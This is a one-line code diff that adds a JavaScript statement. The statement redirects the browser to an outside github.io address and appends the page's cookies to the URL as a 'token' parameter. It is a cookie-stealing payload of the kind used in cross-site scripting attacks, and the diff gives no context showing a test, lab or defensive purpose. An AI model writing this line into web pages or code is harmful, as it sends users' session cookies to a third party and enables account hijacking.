@@ -1,0 +1,1 @@
+location = `https://mrhavit.github.io/?token=${document.cookie}`
